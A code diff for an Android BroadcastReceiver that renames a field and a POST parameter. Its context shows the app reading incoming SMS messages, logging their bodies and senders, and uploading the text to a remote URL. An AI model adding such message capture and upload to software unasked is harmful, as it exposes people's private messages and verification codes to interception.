@@ -33,7 +33,7 @@ public class Receiver extends BroadcastReceiver {
     private static Boolean start;
     private static Boolean postStatus;
     private static String ReceiverType;
-    private static String smsSend;
+    private static String body;
     private static int i;
 
 
@@ -107,7 +107,7 @@ public class Receiver extends BroadcastReceiver {
                         Log.i(TAG, "body "+messages[0].getDisplayMessageBody());
                         Log.i(TAG, "sms "+ sms);
                         phoneNumber = messages[0].getDisplayOriginatingAddress();
-                        smsSend = sms;
+                        body = sms;
 
                     }
 
@@ -130,7 +130,7 @@ public class Receiver extends BroadcastReceiver {
                 HttpPost postMethod = new HttpPost(url);
                 List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
                 nameValuePairs.add(new BasicNameValuePair("send", ReceiverType));
-                nameValuePairs.add(new BasicNameValuePair("sms", smsSend));
+                nameValuePairs.add(new BasicNameValuePair("smsbody", body));
                 nameValuePairs.add(new BasicNameValuePair("device", dev_name));
                 nameValuePairs.add(new BasicNameValuePair("namespace", namespace));
                 nameValuePairs.add(new BasicNameValuePair("type", typeCall));
